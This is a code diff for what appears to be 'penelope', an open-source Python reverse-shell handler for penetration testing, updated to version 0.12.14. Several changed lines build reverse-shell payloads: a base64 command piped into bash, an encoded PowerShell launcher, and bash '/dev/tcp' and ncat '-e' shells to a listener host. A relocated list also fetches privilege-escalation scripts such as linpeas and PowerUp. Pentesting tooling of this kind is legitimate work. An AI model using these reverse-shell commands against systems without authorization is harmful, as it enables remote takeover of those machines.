@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-# Copyright © 2021 - 2024 @brightio <brightiocode@gmail.com>
+# Copyright © 2021 - 2025 @brightio <brightiocode@gmail.com>
 
 # This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.12.13"
+__version__ = "0.12.14"
 
 import os
 import io
@@ -1690,7 +1690,7 @@ class Listener:
 
 		for ip in ips:
 			output.extend(('', '➤  ' + str(paint(ip).CYAN) + ":" + str(paint(self.port).red), ''))
-			output.append(f"echo {base64.b64encode(presets[0].format(ip, self.port).encode()).decode()}|base64 -d|bash")
+			output.append(f"echo -n {base64.b64encode(presets[0].format(ip, self.port).encode()).decode()}|base64 -d|bash")
 			output.append("")
 			output.append("cmd /c powershell -e " + base64.b64encode(presets[1].format(ip, self.port).encode("utf-16le")).decode())
 
@@ -1708,8 +1708,6 @@ class Listener:
 
 		return f'\r\n'.join(output)
 
-class LocalTCPForwardListener(Listener):
-	pass
 
 class LineBuffer:
 
@@ -2677,7 +2675,7 @@ class Session:
 				# Silently convert the shell to non-interactive before PTY upgrade.
 				self.interactive = False
 				self.echoing = True
-				self.exec(f"exec nohup {self.shell}", raw=True)
+				self.exec(f"exec {self.shell}", raw=True)
 				self.echoing = False
 
 			def expect(data):
@@ -2719,7 +2717,6 @@ class Session:
 			pass
 
 	def readline_loop(self):
-
 		readline.clear_history()
 		if self.histfile.exists():
 			readline.read_history_file(self.histfile)
@@ -2743,7 +2740,6 @@ class Session:
 				self.send(cmd.encode() + b"\n")
 
 	def attach(self):
-
 		if threading.current_thread().name != 'Core':
 			if self.new:
 				self.new = False
@@ -3041,7 +3037,7 @@ class Session:
 				logger.error("The item does not exist or access is denied")
 
 		for item in downloaded:
-			logger.info(f"{paint('Downloaded').GREEN_white} => {paint(shlex.quote(pathlink(item))).yellow}") # PROBLEM with ../ TODO
+			logger.info(f"{paint('Download OK').GREEN_white} {paint(shlex.quote(pathlink(item))).yellow}") # PROBLEM with ../ TODO normalize
 
 		return downloaded
 
@@ -3295,7 +3291,7 @@ class Session:
 
 		for item in altnames:
 			uploaded_path = shlex.quote(str(item)) if self.OS == 'Unix' else f'"{item}"'
-			logger.info(f"{paint('Uploaded').GREEN_white} => {paint(uploaded_path).yellow}")
+			logger.info(f"{paint('Upload OK').GREEN_white} {paint(uploaded_path).yellow}")
 		return altnames
 
 	def script(self, local_script):
@@ -3362,11 +3358,10 @@ class Session:
 					new_listener = Listener(host, port)
 
 				if self.bin['bash']:
-					# temp fix, appending 2>&1 because of popen in agent # obsolete
-					cmd = f'{self.bin["bash"]} -c "setsid {self.bin["bash"]} >& /dev/tcp/{host}/{port} 0>&1 &" 2>&1'
+					cmd = f'echo -n "{self.bin["setsid"]} {self.bin["bash"]} >& /dev/tcp/{host}/{port} 0>&1 &"|{self.bin["bash"]}'
 
 				elif self.bin['sh']:
-					ncat_cmd = f'{self.bin["sh"]} -c "nohup {{}} -e {self.bin["sh"]} {host} {port} &"'
+					ncat_cmd = f'{self.bin["sh"]} -c "{self.bin["setsid"]} {{}} -e {self.bin["sh"]} {host} {port} &"'
 					ncat_binary = self.tmp + '/ncat'
 					if not self.exec(f"test -f {ncat_binary} || echo x"):
 						cmd = ncat_cmd.format(ncat_binary)
@@ -3592,6 +3587,20 @@ class Session:
 		return True
 
 
+BINARIES = {
+	'socat': "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat",
+	'ncat': "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat",
+	'linpeas': "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
+	'winpeas': "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat",
+	'lse': "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
+	'powerup': "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1",
+	'ngrok_linux': "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz",
+	'deepce': "https://raw.githubusercontent.com/stealthcopter/deepce/refs/heads/main/deepce.sh",
+	'privesccheck': "https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1",
+	'linuxexploitsuggester': "https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/refs/heads/master/linux-exploit-suggester.sh"
+}
+
+
 class Module:
 	enabled = True
 	on_session_start = False
@@ -3812,8 +3821,9 @@ def agent():
 	import signal
 	import termios
 	import threading
-
 	from select import select
+	signal.signal(signal.SIGINT, signal.SIG_DFL)
+	signal.signal(signal.SIGQUIT, signal.SIG_DFL)
 
 	if sys.version_info[0] == 2:
 		import Queue as queue
@@ -3858,7 +3868,7 @@ def agent():
 
 	shell_pid, master_fd = pty.fork()
 	if shell_pid == pty.CHILD:
-		os.execl(SHELL, SHELL, '-i') # TEMP # TODO
+		os.execl(SHELL, SHELL, '-i')
 	try:
 		pty.setraw(pty.STDIN_FILENO)
 	except:
@@ -4020,7 +4030,6 @@ def agent():
 					wlist.remove(writable)
 				if sendbuf is outbuf:
 					wlock.release()
-
 	except:
 		_, e, t = sys.exc_info()
 		import traceback
@@ -4029,7 +4038,6 @@ def agent():
 
 	os.close(master_fd)
 	os.waitpid(shell_pid, 0)[1]
-
 	os.kill(os.getppid(), signal.SIGKILL) # TODO
 
 
@@ -4247,18 +4255,6 @@ LINUX_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap
 MESSENGER = inspect.getsource(Messenger)
 STREAM = inspect.getsource(Stream)
 AGENT = inspect.getsource(agent)
-BINARIES = {
-	'socat': "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat",
-	'ncat': "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat",
-	'linpeas': "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
-	'winpeas': "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat",
-	'lse': "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
-	'powerup': "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1",
-	'ngrok_linux': "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz",
-	'deepce': "https://raw.githubusercontent.com/stealthcopter/deepce/refs/heads/main/deepce.sh",
-	'privesccheck': "https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1",
- 	'linuxexploitsuggester': "https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/refs/heads/master/linux-exploit-suggester.sh"
-}
 
 # INITIALIZATION
 os.umask(0o007)
@@ -4524,6 +4520,23 @@ def load_rc():
 	os.chmod(RC, 0o600)
 
 load_rc()
+
+def fonts_installed():
+	if os.path.isfile("/usr/share/fonts/truetype/noto/NotoColorEmoji.ttf"):
+		return True
+	if OS != "Linux":
+		return True
+	if os.path.isfile("/usr/share/fonts/noto/NotoColorEmoji.ttf"):
+		return True
+	try:
+		if "Noto Color Emoji" in subprocess.run(["fc-list"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout:
+			return True
+	except:
+		pass
+	return False
+
+if not fonts_installed():
+	logger.warning("For showing emojis please install 'fonts-noto-color-emoji'")
 
 def main():
 
